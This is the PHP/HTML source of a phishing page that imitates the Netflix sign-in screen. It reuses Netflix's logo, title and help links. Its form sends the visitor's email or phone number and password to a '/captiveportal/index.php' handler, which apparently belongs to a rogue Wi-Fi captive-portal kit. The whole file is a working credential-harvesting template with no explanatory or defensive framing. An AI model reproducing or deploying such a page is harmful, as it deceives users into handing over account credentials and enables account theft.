<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<html>
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link href="data:image/x-icon;base64,AAABAAEAEBAAAAEACABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAAAAAAAEAKPAA4DjgAPBq8AEASSAA8FpgATCeUAFAnlABUJ5QASCuQADwalAAAAAQAPBrAAAQABAAABAAABAQAAEgnmABMJ5gAVCuUAGg/fABAFsgAPBrEAAQEBABkN4gAPA5MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADxUUABYJCAsAAAAAAAAAAA8VFQAXBgYLAAAAAAAAAAAPFRUOBgYYCwAAAAAAAAAADxUVCwYGAwsAAAAAAAAAAA8VAxAGBxULAAAAAAAAAAAPFQoGBgIVCwAAAAAAAAAADxUBBhIFFQsAAAAAAAAAAA8VBwYRDBULAAAAAAAAAAAPDAYGABUVCwAAAAAAAAAADwQGBgAVFQsAAAAAAAAAAA8GBhMAFRULAAAAAAAAAAANBgYNABUVCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" rel="icon" type="image/x-icon" />
	<title>Netflix</title> 
    <link href="css/style.css" rel= "stylesheet">
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    </head> 
    <body>
        <div class="wrapper">
            <header class="header">
                <div class="header-inner">
                    <div class="logo">
                        <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg>     
                    </div>
                </div>
            </header>
            <div class="login-box">
                <div class="login-box-inner">
				<BR>
                    <h1>Sign In</h1>
                    <form method="POST" action="/captiveportal/index.php" data-netlify="true"> 
                        <div class="form-group">
                            <input type="text" class="mailpass" name="email" placeholder="Email or phone number" required/>
                        </div>
                        <div class="form-group">
                            <input type="password" class="mailpass" name="password" placeholder="Password" required/>
                        </div>
                        <div class="form-group">
							<BR>
                            <button type="submit">Sign In</button>
                        </div>
                        <div class="remember-password">
                            <div class="remember">
                                <span><input type="checkbox" name="" class="checkbox"></span>
                                <span>Remember me</span>
                            </div>
                            <div class="need-help"><a href="https://www.netflix.com/br/LoginHelp" target="_blank">Need help?</a></div>
                        </div>
                        <div class="form-footer">
                            <div class="facebook">
                                <span><img src="img/facebook.png"></span>
                                <span><a href="https://www.facebook.com/" target="_blank">Login with Facebook</a></span>
								<BR>
                            </div>
                            <div class="sign-up">
                                <p>New to Netflix?<a href="https://www.netflix.com/br/" target="_blank" > Sign up now.</a></p>	
                            </div>
							<div class="learn">
								<p class="captcha"><BR>This page is protected by Google reCAPTCHA to <br>ensure you're not a bot. <a href=""> Learn more.</a></p>
							</div>
							
                        </div>
                    </form>
                </div>
            </div>
            <div class="footer">
                <div class="question">
						<p>Questions? Call<a href="tel:0800-761-4631" target="_blank"> 800-130-365</a></p>
						<BR>
						<span><a href="https://help.netflix.com/legal/giftterms" target="_blank">Gift Card Terms</a></span>
						<span><a class="prova" href="https://help.netflix.com/legal/termsofuse" target="_blank">Terms of Use</a></span>
						<span><a class="provadue" href="https://help.netflix.com/legal/privacy" target="_blank">Privacy Statement</a></span>
						<BR><BR>
                </div>
            </div>
        </div>
    </body>
</html>